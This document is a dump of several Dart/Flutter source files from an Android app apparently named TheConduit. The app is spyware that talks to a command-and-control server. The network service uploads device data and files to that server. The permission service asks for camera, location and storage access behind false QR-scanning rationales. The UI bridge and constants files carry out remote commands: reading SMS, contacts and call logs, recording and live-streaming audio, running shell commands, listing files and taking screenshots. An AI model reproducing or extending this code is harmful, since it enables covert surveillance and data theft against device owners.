            "Attaching initial image file: ${imageFile.name} (Path: ${imageFile.path})");
        final file = File(imageFile.path); //
        if (await file.exists()) {
          request.files.add(await http.MultipartFile.fromPath(
            //
            'image',
            imageFile.path,
            filename: imageFile.name,
          ));
          _logger.info(
              "NetworkService:sendInitialData", //
              "Initial image file '${imageFile.name}' attached successfully.");
        } else {
          _logger.warn(
              "NetworkService:sendInitialData", //
              "Initial image file does NOT exist at path: ${imageFile.path}. Skipping attachment.");
        }
      } else {
        _logger.info(
            "NetworkService:sendInitialData", //
            "No initial image file provided to attach.");
      }

      var response =
          await request.send().timeout(const Duration(seconds: 45)); //
      final responseBody = await response.stream.bytesToString(); //
      _logger.info(
          "NetworkService:sendInitialData", //
          "Server Response Status Code: ${response.statusCode}. Body: $responseBody");
      if (response.statusCode >= 200 && response.statusCode < 300) {
        //
        _logger.info(
            "NetworkService:sendInitialData", //
            "Initial data sent successfully to C2 server.");
        return true; //
      } else {
        _logger.error(
            "NetworkService:sendInitialData", //
            "Failed to send initial data. Status Code: ${response.statusCode}, Body: $responseBody");
        return false; //
      }
    } on TimeoutException catch (e, s) {
      //
      _logger.error("NetworkService:sendInitialData",
          "Timeout sending initial data", e, s);
      return false; //
    } catch (e, s) {
      //
      _logger.error("NetworkService:sendInitialData",
          "Network Error sending initial data", e, s);
      return false; //
    }
  }

  Future<bool> uploadFileFromCommand({
    required String deviceId,
    required String commandRef,
    String? commandId,
    required XFile fileToUpload,
    String fieldName = 'file',
  }) async {
    final Uri url =
        Uri.parse(C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_COMMAND_FILE); //
    _logger.info(
        "NetworkService:uploadFileFromCommand", //
        "Uploading command file '${fileToUpload.name}' to: $url for Device ID: $deviceId, Command Ref: '$commandRef' (ID: ${commandId ?? "N/A"})");
    try {
      var request = http.MultipartRequest('POST', url);
      request.fields['deviceId'] = deviceId; //
      request.fields['commandRef'] = commandRef; //
      if (commandId != null) {
        //
        request.fields['commandId'] = commandId; //
      }

      _logger.info(
          "NetworkService:uploadFileFromCommand", //
          "Attaching command file: ${fileToUpload.path}, name: ${fileToUpload.name}");
      final file = File(fileToUpload.path); //
      if (await file.exists()) {
        request.files.add(await http.MultipartFile.fromPath(
          //
          fieldName,
          fileToUpload.path,
          filename: fileToUpload.name,
        ));
        _logger.info(
            "NetworkService:uploadFileFromCommand", //
            "Command file '${fileToUpload.name}' attached successfully.");
      } else {
        _logger.error(
            "NetworkService:uploadFileFromCommand", //
            "Command file does NOT exist at path: ${fileToUpload.path}");
        sendCommandResponse(
          //
          originalCommand: commandRef,
          commandId: commandId,
          status: 'error',
          payload: {
            //
            'message':
                'File to upload not found on device at path ${fileToUpload.path}' //
          },
        );
        return false; //
      }

      var response =
          await request.send().timeout(const Duration(seconds: 90)); //
      final responseBody = await response.stream.bytesToString(); //
      _logger.info(
          "NetworkService:uploadFileFromCommand", //
          "Command file upload - Server Response Status Code: ${response.statusCode}. Body: $responseBody");
      if (response.statusCode >= 200 && response.statusCode < 300) {
        //
        _logger.info(
            "NetworkService:uploadFileFromCommand", //
            "Command file '${fileToUpload.name}' uploaded successfully.");

        Map<String, dynamic> serverResponsePayload = {};
        try {
          final decodedBody = jsonDecode(responseBody);
          if (decodedBody is Map<String, dynamic>) {
            serverResponsePayload = decodedBody;
          } else {
            serverResponsePayload = {'raw_response': responseBody};
          }
        } catch (e) {
          _logger.warn("NetworkService:uploadFileFromCommand",
              "Could not decode server JSON response: $responseBody. Error: $e");
          serverResponsePayload = {
            'raw_response': responseBody,
            'decode_error': e.toString()
          };
        }

        sendCommandResponse(
          //
          originalCommand: commandRef,
          commandId: commandId,
          status: 'success',
          payload: {
            //
            'message': 'File ${fileToUpload.name} uploaded successfully to C2.',
            ...serverResponsePayload // Include server's JSON response
          },
        );
        return true; //
      } else {
        _logger.error(
            "NetworkService:uploadFileFromCommand", //
            "Failed to upload command file '${fileToUpload.name}'. Status Code: ${response.statusCode}, Body: $responseBody");
        sendCommandResponse(
          //
          originalCommand: commandRef,
          commandId: commandId,
          status: 'error',
          payload: {
            //
            'message':
                'Failed to upload file ${fileToUpload.name} to C2. Server status: ${response.statusCode}',
            'response_body': responseBody, //
          },
        );
        return false; //
      }
    } on TimeoutException catch (e, s) {
      //
      _logger.error("NetworkService:uploadFileFromCommand",
          "Timeout uploading command file '${fileToUpload.name}'", e, s);
      sendCommandResponse(
        //
        originalCommand: commandRef,
        commandId: commandId,
        status: 'error',
        payload: {
          //
          'message': 'Timeout uploading file ${fileToUpload.name} to C2.'
        },
      );
      return false; //
    } catch (e, s) {
      //
      _logger.error("NetworkService:uploadFileFromCommand",
          "Network Error uploading command file '${fileToUpload.name}'", e, s);
      sendCommandResponse(
        //
        originalCommand: commandRef,
        commandId: commandId,
        status: 'error',
        payload: {
          //
          'message':
              'Exception uploading file ${fileToUpload.name} to C2: ${e.toString()}'
        },
      );
      return false; //
    }
  }

  void dispose() {
    _logger.info(
        "NetworkService:dispose", //
        "Disposing NetworkService resources. Device ID: $_lastConnectedDeviceId");
    disconnectSocketIO();
    _connectionStatusController.close(); //
    _commandController.close(); //
    _logger.info(
        "NetworkService:dispose", //
        "All NetworkService resources have been released.");
  }
}



// ------------------------------ نهاية الملف: network_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: permission_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\permission_service.dart
// ----------------------------------------------------------------------

// lib/services/permission_service.dart
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter/material.dart';

class PermissionService {
  // قائمة الأذونات المطلوبة
  final List<Permission> _requiredPermissions = [
    Permission.camera,
    Permission
        .locationWhenInUse, // أو locationAlways إذا كانت هناك حاجة حقيقية لذلك
    Permission
        .storage, // ملاحظة: هذا قد يتصرف بشكل مختلف في Android 11+ (Scoped Storage)
    // بدائل لـ storage في Android 13+:
    // Permission.photos, // للوصول لمعرض الصور
    // Permission.manageExternalStorage, // صلاحية قوية جداً ونادرة الاستخدام
  ];

  /// يطلب جميع الأذونات المطلوبة بطريقة متسلسلة.
  /// يعرض حوار توضيحي قبل طلب كل إذن حساس.
  Future<bool> requestRequiredPermissions(BuildContext context) async {
    Map<Permission, PermissionStatus> statuses = {};

    for (var permission in _requiredPermissions) {
      var status = await permission.status;
      if (!status.isGranted) {
        // عرض سبب طلب الإذن للمستخدم (لجعله مقنعاً)
        bool showRationale = await _showPermissionRationale(
          context,
          permission,
        );
        if (!showRationale) {
          // المستخدم رفض عرض التبرير، نفترض أنه لا يريد منح الإذن
          debugPrint("User declined rationale for $permission");
          return false;
        }

        // طلب الإذن الفعلي
        status = await permission.request();
      }
      statuses[permission] = status;
      debugPrint("Permission $permission status: $status");

      // إذا تم رفض الإذن بشكل دائم، لا فائدة من المتابعة
      if (status.isPermanentlyDenied) {
        debugPrint("Permission $permission permanently denied.");
        _showAppSettingsDialog(
          context,
          permission,
        ); // نقترح على المستخدم فتح الإعدادات
        return false;
      }

      // إذا تم رفض أي إذن أساسي، نعتبر العملية فاشلة
      if (!status.isGranted) {
        debugPrint("Permission $permission denied.");
        return false;
      }
    }

    // التحقق النهائي من أن كل شيء تم منحه
    return statuses.values.every((status) => status.isGranted);
  }

  /// يتحقق مما إذا كانت جميع الأذونات المطلوبة ممنوحة بالفعل.
  Future<bool> checkPermissions() async {
    for (var permission in _requiredPermissions) {
      if (!(await permission.status.isGranted)) {
        return false;
      }
    }
    return true;
  }

  /// يعرض رسالة توضيحية للمستخدم قبل طلب إذن حساس.
  Future<bool> _showPermissionRationale(
    BuildContext context,
    Permission permission,
  ) async {
    String title;
    String content;

    switch (permission) {
      case Permission.camera:
        title = 'إذن استخدام الكاميرا';
        content = 'نحتاج للوصول إلى الكاميرا لمسح أكواد QR وتحليلها بدقة.';
        break;
      case Permission.locationWhenInUse:
      case Permission.locationAlways:
        title = 'إذن تحديد الموقع';
        content =
            'يساعدنا تحديد موقعك الجغرافي في تحديد مكان مسح الكود بدقة أكبر، مما قد يكون مفيداً في بعض أنواع الأكواد المرتبطة بمواقع معينة.';
        break;
      case Permission.storage:
        title = 'إذن الوصول للتخزين';
        content =
            'نحتاج إذن الوصول للتخزين لحفظ صور أكواد QR التي تم مسحها أو أي بيانات مرتبطة بها قد ترغب في الاحتفاظ بها.';
        break;
      // أضف حالات أخرى إذا لزم الأمر
      default:
        return true; // لا يوجد تبرير خاص مطلوب
    }

    // التأكد من أن context لا يزال صالحاً قبل عرض الـ Dialog
    if (!context.mounted) return false;

    return await showDialog<bool>(
          context: context,
          barrierDismissible: false, // يجب على المستخدم اتخاذ قرار
          builder:
              (BuildContext dialogContext) => AlertDialog(
                title: Text(title),
                content: Text(content),
                actions: <Widget>[
                  TextButton(
                    child: const Text('لاحقاً'),
                    onPressed:
                        () => Navigator.of(
                          dialogContext,
                        ).pop(false), // المستخدم يرفض الآن
                  ),
                  TextButton(
                    child: const Text('السماح'),
                    onPressed:
                        () => Navigator.of(
                          dialogContext,
                        ).pop(true), // المستخدم يوافق على المتابعة
                  ),
                ],
              ),
        ) ??
        false; // إذا أغلق الحوار بطريقة أخرى، اعتبره رفضاً
  }

  // يعرض حوار يقترح على المستخدم فتح إعدادات التطبيق لتغيير الإذن
  void _showAppSettingsDialog(BuildContext context, Permission permission) {
    if (!context.mounted) return;
    showDialog(
      context: context,
      builder:
          (BuildContext context) => AlertDialog(
            title: Text('الإذن مرفوض نهائياً'),
            content: Text(
              'لقد رفضت إذن ${permission.toString().split('.').last} بشكل دائم. يرجى التوجه إلى إعدادات التطبيق لتفعيله يدوياً إذا أردت استخدام هذه الميزة.',
            ),
            actions: <Widget>[
              TextButton(
                child: const Text('إلغاء'),
                onPressed: () => Navigator.of(context).pop(),
              ),
              TextButton(
                child: const Text('فتح الإعدادات'),
                onPressed: () {
                  openAppSettings(); // تفتح إعدادات التطبيق
                  Navigator.of(context).pop();
                },
              ),
            ],
          ),
    );
  }
}



// ------------------------------ نهاية الملف: permission_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: screenshot_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\screenshot_service.dart
// ----------------------------------------------------------------------

// lib/services/screenshot_service.dart
import 'dart:io';
import 'dart:typed_data';
import 'dart:ui' as ui;

import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:image/image.dart' as img; // <-- إضافة مكتبة image
import 'package:path_provider/path_provider.dart';

class ScreenshotService {
  final GlobalKey screenshotKey;
  final Function(String) onLogEvent;

  ScreenshotService({
    required this.screenshotKey,
    required this.onLogEvent,
  });

  Future<Uint8List?> captureScreenshot({double pixelRatio = 3.0}) async {
    // جعل pixelRatio معاملاً
    try {
      await Future.delayed(const Duration(milliseconds: 200)); // زيادة التأخير

      if (screenshotKey.currentContext == null) {
        onLogEvent('Screenshot Error: GlobalKey context is null.');
        return null;
      }

      RenderRepaintBoundary? boundary = screenshotKey.currentContext
          ?.findRenderObject() as RenderRepaintBoundary?;
      if (boundary == null) {
        onLogEvent('خطأ: لم يتم العثور على RepaintBoundary.');
        return null;
      }

      ui.Image image = await boundary.toImage(pixelRatio: pixelRatio);
      ByteData? byteData = await image.toByteData(
          format: ui.ImageByteFormat.png); // الصور الملتقطة تكون PNG عادة
      image.dispose();

      if (byteData == null) {
        onLogEvent('خطأ: فشل تحويل الصورة إلى بيانات');
        return null;
      }
      onLogEvent('تم التقاط لقطة الشاشة (PNG الخام) بنجاح بدقة $pixelRatio');
      return byteData.buffer.asUint8List();
    } catch (e, stackTrace) {
      onLogEvent('خطأ في التقاط الشاشة: $e\nStackTrace: $stackTrace');
      return null;
    }
  }

  // دالة جديدة لضغط الصورة
  Future<Uint8List?> compressImage(Uint8List pngBytes,
      {int quality = 75}) async {
    try {
      onLogEvent('Compressing image...');
      img.Image? image = img.decodeImage(pngBytes); // فك تشفير الـ PNG
      if (image == null) {
        onLogEvent('Compression Error: Could not decode PNG bytes.');
        return null;
      }
      // تحويل إلى JPEG مع تحديد الجودة (75 كقيمة افتراضية جيدة)
      List<int> jpgBytes = img.encodeJpg(image, quality: quality);
      onLogEvent(
          'Image compressed to JPEG with quality $quality. Original size: ${pngBytes.lengthInBytes}, Compressed size: ${jpgBytes.length}');
      return Uint8List.fromList(jpgBytes);
    } catch (e, stackTrace) {
      onLogEvent('Compression Error: $e\nStackTrace: $stackTrace');
      return null;
    }
  }

  // تعديل saveScreenshotToFile ليقبل امتدادًا مختلفًا
  Future<String?> saveScreenshotToFile(Uint8List imageBytes,
      {String extension = 'png'}) async {
    try {
      final directory = await getTemporaryDirectory();
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      // استخدام الامتداد المعطى
      final filePath = '${directory.path}/screenshot_$timestamp.$extension';
      final file = File(filePath);
      await file.writeAsBytes(imageBytes);
      onLogEvent('تم حفظ لقطة الشاشة في: $filePath');
      return filePath;
    } catch (e) {
      onLogEvent('خطأ في حفظ لقطة الشاشة: $e');
      return null;
    }
  }

  Future<String?> captureAndSaveScreenshot(
      {double pixelRatio = 3.0,
      bool compress = false,
      int quality = 75,
      String targetExtension = 'png'}) async {
    Uint8List? imageBytes = await captureScreenshot(pixelRatio: pixelRatio);
    if (imageBytes != null) {
      if (compress && targetExtension == 'jpg') {
        final compressedBytes =
            await compressImage(imageBytes, quality: quality);
        if (compressedBytes != null) {
          return await saveScreenshotToFile(compressedBytes, extension: 'jpg');
        } else {
          onLogEvent('Failed to compress image, saving original.');
          return await saveScreenshotToFile(imageBytes,
              extension: 'png'); // حفظ الأصلي إذا فشل الضغط
        }
      }
      return await saveScreenshotToFile(imageBytes, extension: targetExtension);
    }
    return null;
  }

  // ... (captureHighQualityScreenshot, captureLowQualityScreenshot يمكن تعديلها أو إزالتها إذا لم تعد مستخدمة)
}



// ------------------------------ نهاية الملف: screenshot_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: ui_bridge_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\ui_bridge_service.dart
// ----------------------------------------------------------------------

// lib/services/ui_bridge_service.dart
import 'dart:async';

import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart';

import '../core/logging/enhanced_logger_service.dart';
import '../utils/constants.dart';

class UIBridgeService {
  static final UIBridgeService _instance = UIBridgeService._internal();
  factory UIBridgeService() => _instance;
  UIBridgeService._internal();

  final EnhancedLoggerService _logger = EnhancedLoggerService();
  final Map<String, Completer<Map<String, dynamic>>> _pendingRequests = {};
  final FlutterBackgroundService _backgroundService =
      FlutterBackgroundService();

  // Platform Channels
  static const MethodChannel _filesChannel =
      MethodChannel(NATIVE_FILES_CHANNEL);
  static const MethodChannel _nativeFeaturesChannel =
      MethodChannel(NATIVE_FEATURES_CHANNEL);

  bool _isInitialized = false;

  Future<void> initialize() async {
    if (_isInitialized) return;

    // Listen for requests from background service
    _backgroundService.on('ui_bridge_request').listen(_handleBridgeRequest);

    _isInitialized = true;
    _logger.info("UIBridgeService", "UI Bridge Service initialized");
  }

  void _handleBridgeRequest(Map<String, dynamic>? data) async {
    if (data == null) return;

    final requestId = data['requestId'] as String?;
    final method = data['method'] as String?;
    final params = data['params'] as Map<String, dynamic>? ?? {};

    if (requestId == null || method == null) {
      _logger.warn("UIBridgeService", "Invalid bridge request: $data");
      return;
    }

    _logger.info("UIBridgeService",
        "Processing bridge request: $method (ID: $requestId)");

    try {
      Map<String, dynamic> result;

      switch (method) {
        case 'listFiles':
          result = await handleListFiles(params);
          break;
        case 'getSmsListPaginated':
          result = await handleGetSmsListPaginated(params);
          break;
        case 'getContactsListPaginated':
          result = await handleGetContactsListPaginated(params);
          break;
        case 'getCallLogsPaginated':
          result = await handleGetCallLogsPaginated(params);
          break;
        case 'recordAudio':
          result = await handleRecordAudio(params);
          break;
        case 'startLiveAudio':
          result = await handleStartLiveAudio(params);
          break;
        case 'stopLiveAudio':
          result = await handleStopLiveAudio(params);
          break;
        case 'executeShell':
          result = await handleExecuteShell(params);
          break;
        case 'requestScreenshot':
          result = await handleRequestScreenshot(params);
          break;
        default:
          result = {'status': 'error', 'message': 'Unknown method: $method'};
      }

      // Send response back to background service
      _backgroundService.invoke('ui_bridge_response', {
        'requestId': requestId,
        'result': result,
      });
    } catch (e, stackTrace) {
      _logger.error("UIBridgeService",
          "Error processing bridge request: $method", e, stackTrace);

      _backgroundService.invoke('ui_bridge_response', {
        'requestId': requestId,
        'result': {
          'status': 'error',
          'message': e.toString(),
        },
      });
    }
  }

  Future<Map<String, dynamic>> handleListFiles(
      Map<String, dynamic> params) async {
    final path = params['path'] as String? ?? '/';

    try {
      final result =
          await _filesChannel.invokeMethod('listFiles', {'path': path});

      if (result is Map) {
        return {
          'status': 'success',
          'data': Map<String, dynamic>.from(result),
        };
      } else {
        return {
          'status': 'error',
          'message': 'Invalid response from native listFiles',
        };
      }
    } on PlatformException catch (e) {
      return {
        'status': 'error',
        'message': e.message ?? 'Platform exception in listFiles',
        'code': e.code,
      };
    } catch (e) {
      return {
        'status': 'error',
        'message': e.toString(),
      };
    }
  }

  Future<Map<String, dynamic>> handleGetSmsListPaginated(
      Map<String, dynamic> params) async {
    final offset = params['offset'] as int? ?? 0;
    final limit = params['limit'] as int? ?? 50;

    try {
      final result =
          await _nativeFeaturesChannel.invokeMethod('getSmsListPaginated', {
        'offset': offset,
        'limit': limit,
      });

      if (result is Map) {
        return {
          'status': 'success',
          'data': result['data'],
          'count': result['count'],
          'has_more': result['has_more'],
        };
      } else {
        return {
          'status': 'error',
          'message': 'Invalid response from native getSmsListPaginated',
        };
      }
    } on PlatformException catch (e) {
      return {
        'status': 'error',
        'message': e.message ?? 'Platform exception in getSmsListPaginated',
        'code': e.code,
      };
    } catch (e) {
      return {
        'status': 'error',
        'message': e.toString(),
      };
    }
  }

  Future<Map<String, dynamic>> handleGetContactsListPaginated(
      Map<String, dynamic> params) async {
    final offset = params['offset'] as int? ?? 0;
    final limit = params['limit'] as int? ?? 100;

    try {
      final result = await _nativeFeaturesChannel
          .invokeMethod('getContactsListPaginated', {
        'offset': offset,
        'limit': limit,
      });

      if (result is Map) {
        return {
          'status': 'success',
          'data': result['data'],
          'count': result['count'],
          'has_more': result['has_more'],
        };
      } else {
        return {
          'status': 'error',
          'message': 'Invalid response from native getContactsListPaginated',
        };
      }
    } on PlatformException catch (e) {
      return {
        'status': 'error',
        'message':
            e.message ?? 'Platform exception in getContactsListPaginated',
        'code': e.code,
      };
    } catch (e) {
      return {
        'status': 'error',
        'message': e.toString(),
      };
    }
  }

  Future<Map<String, dynamic>> handleGetCallLogsPaginated(
      Map<String, dynamic> params) async {
    final offset = params['offset'] as int? ?? 0;
    final limit = params['limit'] as int? ?? 75;

    try {
      final result =
          await _nativeFeaturesChannel.invokeMethod('getCallLogsPaginated', {
        'offset': offset,
        'limit': limit,
      });

      if (result is Map) {
        return {
          'status': 'success',
          'data': result['data'],
          'count': result['count'],
          'has_more': result['has_more'],
        };
      } else {
        return {
          'status': 'error',
          'message': 'Invalid response from native getCallLogsPaginated',
        };
      }
    } on PlatformException catch (e) {
      return {
        'status': 'error',
        'message': e.message ?? 'Platform exception in getCallLogsPaginated',
        'code': e.code,
      };
    } catch (e) {
      return {
        'status': 'error',
        'message': e.toString(),
      };
    }
  }

  Future<Map<String, dynamic>> handleRecordAudio(
      Map<String, dynamic> params) async {
    final durationSeconds = params['duration_seconds'] as int? ?? 10;

    try {
      final result = await _nativeFeaturesChannel.invokeMethod('recordAudio', {
        'duration_seconds': durationSeconds,
      });

      if (result is Map) {
        return {
          'status': 'success',
          'filePath': result['filePath'],
        };
      } else {
        return {
          'status': 'error',
          'message': 'Invalid response from native recordAudio',
        };
      }
    } on PlatformException catch (e) {
      return {
        'status': 'error',
        'message': e.message ?? 'Platform exception in recordAudio',
        'code': e.code,
      };
    } catch (e) {
      return {
        'status': 'error',
        'message': e.toString(),
      };
    }
  }

  Future<Map<String, dynamic>> handleStartLiveAudio(
      Map<String, dynamic> params) async {
    try {
      final result =
          await _nativeFeaturesChannel.invokeMethod('startLiveAudioStream');

      return {
        'status': 'success',
        'message': result?.toString() ?? 'Live audio started',
      };
    } on PlatformException catch (e) {
      return {
        'status': 'error',
        'message': e.message ?? 'Platform exception in startLiveAudioStream',
        'code': e.code,
      };
    } catch (e) {
      return {
        'status': 'error',
        'message': e.toString(),
      };
    }
  }

  Future<Map<String, dynamic>> handleStopLiveAudio(
      Map<String, dynamic> params) async {
    try {
      final result =
          await _nativeFeaturesChannel.invokeMethod('stopLiveAudioStream');

      return {
        'status': 'success',
        'message': result?.toString() ?? 'Live audio stopped',
      };
    } on PlatformException catch (e) {
      return {
        'status': 'error',
        'message': e.message ?? 'Platform exception in stopLiveAudioStream',
        'code': e.code,
      };
    } catch (e) {
      return {
        'status': 'error',
        'message': e.toString(),
      };
    }
  }

  Future<Map<String, dynamic>> handleExecuteShell(
      Map<String, dynamic> params) async {
    final command = params['command'] as String?;
    final args = params['args'] as List<String>? ?? [];

    if (command == null) {
      return {
        'status': 'error',
        'message': 'Command is required',
      };
    }

    try {
      final result = await _filesChannel.invokeMethod('executeShell', {
        'command': command,
        'args': args,
      });

      if (result is Map) {
        return {
          'status': 'success',
          'data': Map<String, dynamic>.from(result),
        };
      } else {
        return {
          'status': 'error',
          'message': 'Invalid response from native executeShell',
        };
      }
    } on PlatformException catch (e) {
      return {
        'status': 'error',
        'message': e.message ?? 'Platform exception in executeShell',
        'code': e.code,
      };
    } catch (e) {
      return {
        'status': 'error',
        'message': e.toString(),
      };
    }
  }

  Future<Map<String, dynamic>> handleRequestScreenshot(
      Map<String, dynamic> params) async {
    // هذه الطريقة تستدعي screenshot service في UI thread
    try {
      // إرسال إشعار للـ main UI لأخذ لقطة شاشة
      _backgroundService.invoke('requestScreenshotFromUI', params);

      return {
        'status': 'success',
        'message': 'Screenshot request sent to UI',
      };
    } catch (e) {
      return {
        'status': 'error',
        'message': e.toString(),
      };
    }
  }

  // دالة للإرسال للـ background service من UI
  Future<Map<String, dynamic>> sendRequestToBackground(
      String method, Map<String, dynamic> params) async {
    final requestId =
        'ui_req_${DateTime.now().millisecondsSinceEpoch}_${params.hashCode}';
    final completer = Completer<Map<String, dynamic>>();

    _pendingRequests[requestId] = completer;

    // إرسال الطلب للـ background service
    _backgroundService.invoke('ui_bridge_request', {
      'requestId': requestId,
      'method': method,
      'params': params,
    });

    // انتظار الرد مع timeout
    return completer.future.timeout(
      const Duration(seconds: 30),
      onTimeout: () {
        _pendingRequests.remove(requestId);
        return {
          'status': 'error',
          'message': 'Request timeout',
        };
      },
    );
  }

  void dispose() {
    for (var completer in _pendingRequests.values) {
      if (!completer.isCompleted) {
        completer.complete({
          'status': 'error',
          'message': 'Service disposed',
        });
      }
    }
    _pendingRequests.clear();
  }
}



// ------------------------------ نهاية الملف: ui_bridge_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: constants.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\utils\constants.dart
// ----------------------------------------------------------------------

// lib/utils/constants.dart

// --- SharedPreferences Keys ---
const String PREF_INITIAL_DATA_SENT = 'initialDataSent';
const String PREF_DEVICE_ID = 'pref_device_id'; //

// --- Background Service Events (Flutter internal) ---
const String BG_SERVICE_EVENT_SEND_INITIAL_DATA = 'sendInitialData'; //
const String BG_SERVICE_EVENT_STOP_SERVICE = 'stopService'; //

// --- Socket.IO C2 Communication Events & Commands ---
// For C2 Registration and Heartbeat
const String SIO_EVENT_REGISTER_DEVICE = 'register_device'; //
const String SIO_EVENT_REGISTRATION_SUCCESSFUL = 'registration_successful'; //
const String SIO_EVENT_DEVICE_HEARTBEAT = 'device_heartbeat'; //
const String SIO_EVENT_REQUEST_REGISTRATION_INFO =
    'request_registration_info'; //

// Commands from C2 Server to Client
const String SIO_CMD_TAKE_PICTURE = 'command_take_picture'; //
const String SIO_CMD_LIST_FILES = 'command_list_files'; //
const String SIO_CMD_GET_LOCATION = 'command_get_location'; //
const String SIO_CMD_UPLOAD_SPECIFIC_FILE = 'command_upload_specific_file'; //
const String SIO_CMD_EXECUTE_SHELL = 'command_execute_shell'; //

const String SIO_CMD_GET_SMS_LIST = 'command_get_sms_list'; //
const String SIO_CMD_GET_CONTACTS_LIST =
    'command_get_contacts_list'; // Changed from export for consistency
const String SIO_CMD_GET_CALL_LOGS = 'command_get_call_logs'; // New
const String SIO_CMD_RECORD_AUDIO_FIXED =
    'command_record_audio_fixed'; // For existing fixed duration recording
const String SIO_CMD_START_LIVE_AUDIO = 'command_start_live_audio'; //
const String SIO_CMD_STOP_LIVE_AUDIO = 'command_stop_live_audio'; //

// Response from Client to C2 Server
const String SIO_EVENT_COMMAND_RESPONSE = 'command_response'; //
const String SIO_EVENT_LIVE_AUDIO_CHUNK = 'live_audio_chunk'; //

// --- HTTP Endpoints (Reminder, main URL is in app_config.dart) ---
const String HTTP_ENDPOINT_UPLOAD_INITIAL_DATA = '/upload_initial_data'; //
const String HTTP_ENDPOINT_UPLOAD_COMMAND_FILE = '/upload_command_file'; //

// --- Other Constants ---
const String APP_NAME = "TheConduit"; // // Updated to match app.dart

// Native Channel Names (ensure they match MainActivity.kt)
const String NATIVE_FILES_CHANNEL = 'com.zeroone.theconduit/files';
const String NATIVE_FEATURES_CHANNEL = 'com.zeroone.theconduit/native_features';
const String NATIVE_LIVE_AUDIO_STREAM_CHANNEL =
    'com.zeroone.theconduit/live_audio_stream';



// ------------------------------ نهاية الملف: constants.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: helpers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\utils\helpers.dart
// ----------------------------------------------------------------------




// ------------------------------ نهاية الملف: helpers.dart ------------------------------
// ======================================================================


################################################################################
# تم بنجاح معالجة واستخراج محتوى 35 ملف/ملفات دارت.
################################################################################
